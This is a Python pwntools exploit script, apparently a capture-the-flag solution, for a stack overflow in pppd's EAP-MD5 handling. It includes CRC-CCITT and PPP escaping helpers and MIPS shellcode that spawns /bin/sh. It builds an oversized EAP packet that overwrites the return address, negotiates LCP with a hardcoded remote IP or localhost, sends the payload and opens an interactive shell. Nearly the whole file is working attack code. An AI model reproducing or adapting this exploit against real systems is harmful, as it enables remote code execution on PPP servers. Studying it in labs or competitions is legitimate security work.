#!/usr/bin/env python3
from pwn import *

crc_ccitt_table = [
    0x0000, 0x1189, 0x2312, 0x329b, 0x4624, 0x57ad, 0x6536, 0x74bf,
    0x8c48, 0x9dc1, 0xaf5a, 0xbed3, 0xca6c, 0xdbe5, 0xe97e, 0xf8f7,
    0x1081, 0x0108, 0x3393, 0x221a, 0x56a5, 0x472c, 0x75b7, 0x643e,
    0x9cc9, 0x8d40, 0xbfdb, 0xae52, 0xdaed, 0xcb64, 0xf9ff, 0xe876,
    0x2102, 0x308b, 0x0210, 0x1399, 0x6726, 0x76af, 0x4434, 0x55bd,
    0xad4a, 0xbcc3, 0x8e58, 0x9fd1, 0xeb6e, 0xfae7, 0xc87c, 0xd9f5,
    0x3183, 0x200a, 0x1291, 0x0318, 0x77a7, 0x662e, 0x54b5, 0x453c,
    0xbdcb, 0xac42, 0x9ed9, 0x8f50, 0xfbef, 0xea66, 0xd8fd, 0xc974,
    0x4204, 0x538d, 0x6116, 0x709f, 0x0420, 0x15a9, 0x2732, 0x36bb,
    0xce4c, 0xdfc5, 0xed5e, 0xfcd7, 0x8868, 0x99e1, 0xab7a, 0xbaf3,
    0x5285, 0x430c, 0x7197, 0x601e, 0x14a1, 0x0528, 0x37b3, 0x263a,
    0xdecd, 0xcf44, 0xfddf, 0xec56, 0x98e9, 0x8960, 0xbbfb, 0xaa72,
    0x6306, 0x728f, 0x4014, 0x519d, 0x2522, 0x34ab, 0x0630, 0x17b9,
    0xef4e, 0xfec7, 0xcc5c, 0xddd5, 0xa96a, 0xb8e3, 0x8a78, 0x9bf1,
    0x7387, 0x620e, 0x5095, 0x411c, 0x35a3, 0x242a, 0x16b1, 0x0738,
    0xffcf, 0xee46, 0xdcdd, 0xcd54, 0xb9eb, 0xa862, 0x9af9, 0x8b70,
    0x8408, 0x9581, 0xa71a, 0xb693, 0xc22c, 0xd3a5, 0xe13e, 0xf0b7,
    0x0840, 0x19c9, 0x2b52, 0x3adb, 0x4e64, 0x5fed, 0x6d76, 0x7cff,
    0x9489, 0x8500, 0xb79b, 0xa612, 0xd2ad, 0xc324, 0xf1bf, 0xe036,
    0x18c1, 0x0948, 0x3bd3, 0x2a5a, 0x5ee5, 0x4f6c, 0x7df7, 0x6c7e,
    0xa50a, 0xb483, 0x8618, 0x9791, 0xe32e, 0xf2a7, 0xc03c, 0xd1b5,
    0x2942, 0x38cb, 0x0a50, 0x1bd9, 0x6f66, 0x7eef, 0x4c74, 0x5dfd,
    0xb58b, 0xa402, 0x9699, 0x8710, 0xf3af, 0xe226, 0xd0bd, 0xc134,
    0x39c3, 0x284a, 0x1ad1, 0x0b58, 0x7fe7, 0x6e6e, 0x5cf5, 0x4d7c,
    0xc60c, 0xd785, 0xe51e, 0xf497, 0x8028, 0x91a1, 0xa33a, 0xb2b3,
    0x4a44, 0x5bcd, 0x6956, 0x78df, 0x0c60, 0x1de9, 0x2f72, 0x3efb,
    0xd68d, 0xc704, 0xf59f, 0xe416, 0x90a9, 0x8120, 0xb3bb, 0xa232,
    0x5ac5, 0x4b4c, 0x79d7, 0x685e, 0x1ce1, 0x0d68, 0x3ff3, 0x2e7a,
    0xe70e, 0xf687, 0xc41c, 0xd595, 0xa12a, 0xb0a3, 0x8238, 0x93b1,
    0x6b46, 0x7acf, 0x4854, 0x59dd, 0x2d62, 0x3ceb, 0x0e70, 0x1ff9,
    0xf78f, 0xe606, 0xd49d, 0xc514, 0xb1ab, 0xa022, 0x92b9, 0x8330,
    0x7bc7, 0x6a4e, 0x58d5, 0x495c, 0x3de3, 0x2c6a, 0x1ef1, 0x0f78,
]


def crc_ccitt_byte(crc, c):
    return (crc >> 8) ^ crc_ccitt_table[(crc ^ c) & 0xff]


def compute_fcs(buf):
    fcs = 0xffff  # PPP_INITFCS
    for c in buf:
        fcs = crc_ccitt_byte(fcs, c)
    return fcs


def unescape(buf):
    result = bytearray()
    i = 0
    while i < len(buf):
        if buf[i] == 0x7d:
            i += 1
            result.append(buf[i] ^ 0x20)
        else:
            result.append(buf[i])
        i += 1
    return result


def escape(buf):
    result = bytearray()
    i = 0
    while i < len(buf):
        if buf[i] < 0x20 or buf[i] == 0x7d or buf[i] == 0x7e:
            result.append(0x7d)
            result.append(buf[i] ^ 0x20)
        else:
            result.append(buf[i])
        i += 1
    return result


def am_i_sane():
    sample = bytes.fromhex(
        '7e ff 7d 23  c0 21 7d 21  7d 21 7d 20  7d 38 7d 22'
        '7d 26 7d 20  7d 20 7d 20  7d 20 7d 23  7d 24 c2 27'
        '7d 25 7d 26  7d 33 54 34  d8 7d 27 7d  22 7d 28 7d'
        '22 4c d9 7e'
    )
    assert len(sample) == 52
    assert sample[0] == 0x7e and sample[-1] == 0x7e
    assert escape(unescape(sample[1:-1])) == sample[1:-1]
    sample = unescape(sample)
    assert (sample.hex() ==
            '7eff03c021'  # flag, address, control, protocol 
            '01010018'  # lcp code (Configure-Request), identifier, length 
            '020600000000'  # lcp Async-Control-Character-Map (empty)
            '0304c227'  # lcp Authentication-Protocol (EAP)
            '0506135434d8'  # lcp Magic-Number
            '0702'  # lcp Protocol-Field-Compression (none)
            '0802'  # lcp Address-and-Control-Field-Compression (none)
            '4cd9'  # fcs
            '7e'  # flag
            )
    # over all bits of the Address, Control, Protocol and Information fields
    fcs = compute_fcs(sample[1:-1])
    assert fcs == 0xf0b8, fcs.hex()  # PPPGOODFCS
    return True


assert am_i_sane()

context.arch = 'mips'
SHELLCODE = asm('''
/* tty_disestablish_ppp(0) */
xor $a0, $a0, $a0
lui $t9, 0x0042
addiu $t9, 0x5d8c
jalr $t9
nop
/* execl("/bin/sh", "/bin/sh", 0) */
lui $a0, 0x0044
addiu $a0, -0x1064
move $a1, $a0
xor $a2, $a2, $a2
lui $t9, 0x0044
addiu $t9, -0x1620
jalr $t9
nop
''')
print(SHELLCODE.hex())


def prep_kaboom():
    ppp_header = (
        b'\xff'  # Address: PPP_ALLSTATIONS
        b'\x03'  # Control
        b'\xc2\x27'  # Protocol: PPP_EAP
    )
    eap_header = (
        b'\x01'  # Code: Request
        b'\x6e'  # Id
        b'\x03\x00'  # Length: 768 (including the Code, Identifier, Length and Data fields)
        b'\x04'  # Type: MD5-EAP
    )
    eap_md5_header = (
        b'\x0a'  # Value-Size
        b'???EBUT???'  # Value
    )
    eap_md5_name = bytearray()
    chars = string.ascii_letters + string.digits
    for i in range(768 - len(eap_header) - len(eap_md5_header)):
        eap_md5_name.append(ord(chars[(i >> 2) % len(chars)]))
    ret_off = (len(chars) + chars.index('R')) << 2
    eap_md5_name[ret_off:ret_off + 4] = struct.pack('<I', 0x463184)  # inpacket_buf + 20
    eap_md5_name[:len(SHELLCODE)] = SHELLCODE
    kaboom = ppp_header + eap_header + eap_md5_header + eap_md5_name
    fcs_field = ~compute_fcs(kaboom) & 0xffff
    kaboom += struct.pack('<H', fcs_field)
    fcs_check = compute_fcs(kaboom)
    assert fcs_check == 0xf0b8, hex(fcs_check)
    kaboom = b'\x7e' + escape(kaboom) + b'\x7e'

    # sanity check
    kaboom0 = unescape(kaboom)
    fcs0 = compute_fcs(kaboom0[1:-1])
    assert fcs0 == 0xf0b8, hex(fcs0)

    return kaboom


def recv_packet(io):
    io.recvuntil(b'\x7e')
    packet = unescape(io.recvuntil(b'\x7e')[:-1])
    assert compute_fcs(packet) == 0xf0b8
    return packet


def send_packet(io, packet):
    packet = b'\x7e' + escape(packet) + b'\x7e'
    io.send(packet)


def send_packet_compute_checksum(io, packet):
    packet = packet + struct.pack('<H', ~compute_fcs(packet) & 0xffff)
    assert compute_fcs(packet) == 0xf0b8
    packet = b'\x7e' + escape(packet) + b'\x7e'
    io.send(packet)


kaboom = prep_kaboom()

if args.LOCAL:
    io = remote('localhost', 8848)
else:
    io = remote('134.175.208.201', 8848)

while True:
    packet = recv_packet(io)
    if packet[4] == 1:
        print(f'Received Configure-Request, Id={packet[5]}')
        configure_ack = bytearray(packet)
        configure_ack[4] = 2
        print(f'Replying with Configure-Ack')
        send_packet_compute_checksum(io, configure_ack[:-2])
        print(f'Sending empty Configure-Request')
        send_packet_compute_checksum(
            io,
            b'\xff\x03\xc0\x21'  # address, control protocol (LCP) 
            b'\x01\x01\x00\x04',  # lcp code, identifier, length
        )
    elif packet[4] == 2:
        # Configure-Ack
        print(f'Received Configure-Ack, Id={packet[5]}')
        send_packet(io, packet)
        pause()
        io.send(kaboom)
        break
    else:
        raise Exception(f'WTF: {packet.hex()}')
io.interactive()
